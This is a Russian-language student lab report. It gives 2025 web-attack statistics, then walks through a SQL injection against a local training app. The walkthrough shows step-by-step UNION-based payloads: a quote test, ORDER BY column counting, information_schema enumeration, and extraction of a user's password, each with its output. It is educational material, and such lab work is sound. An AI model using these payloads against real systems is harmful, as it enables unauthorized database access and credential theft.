Часть 1
1) ссылки на источники
https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/
https://arppsoft.ru/boards/edu/news/members/21614/
https://arppsoft.ru/catalog/news/members/21702/

2)доля успешных атак на организации, проведенных с помощью эксплуатации веб-
уязвимостей
31%

3)распределение по конкретным уязвимостям

Данные по отраслям (Россия, 2025) — наиболее атакуемые сектора 

Транспорт и логистика: 47%
Федеральные органы власти: 21%
Онлайн-ритейл: 17%
Региональные органы власти: 6%
ИТ-сектор: 6%

Типы атак:
XSS (межсайтовый скриптинг): 20%

RCE (удалённое выполнение кода): 15%

Path Traversal (обход пути): замыкает ТОП-3

Часть 2

На localhost:8080 "установить/сбросить базу" и "приступить к выполнению заданий"

1)Перебор id:

В URL вводим id:
http://localhost:8080/task/?id=1

Вывод:
Ваш id:1
Ваш логин:admin

Аналогично:
Ваш id:4
Ваш логин:Vinni-pukh

Ваш id:9
Ваш логин:Volk2

2)Проверка уязвимости на SQL-инъекцию

Ввод: http://localhost:8080/task/?id=1%27

Вывод: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

Значит база данных — MySQL, параметр id напрямую подставляется в SQL-запрос, приложение не фильтрует и не экранирует спецсимволы.

3)Осознаём количество колонок
С помощью ORDER BY запросами:
http://localhost:8080/task/?id=1%27%20ORDER%20BY%201%20--%20
http://localhost:8080/task/?id=1%27%20ORDER%20BY%202%20--%20
http://localhost:8080/task/?id=1%27%20ORDER%20BY%203%20--%20
http://localhost:8080/task/?id=1%27%20ORDER%20BY%204%20--%20
На четвёртый URL вывод: Unknown column '4' in 'order clause'

Запрос содержит 3 столбца.

4)Ищем видимые колонки

http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20111,222,333%20--%20

Ваш id:111
Ваш логин:222

Не видна третья колонока.

Проверка, отображается ли первая колонка для текста:

http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20%27test%27,222,333%20--%20

Ваш id:test
Ваш логин:222

Да, отображается.

5)Узнаём столбцы таблицы

http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema=%27security%27%20LIMIT%201,1%20--%20

Ваш id:1
Ваш логин:users

Данная таблица содержит информацию о пользователях.

http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27%20AND%20table_schema=database()--+

Ваш id:1
Ваш логин:id,username,password

Имеем названия столбцов.

6)Пароль Volk2

http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=%27Volk2%27%20--%20

Ваш id:1
Ваш логин:Wa spoiuuuuu

Ответ: Wa spoiuuuuu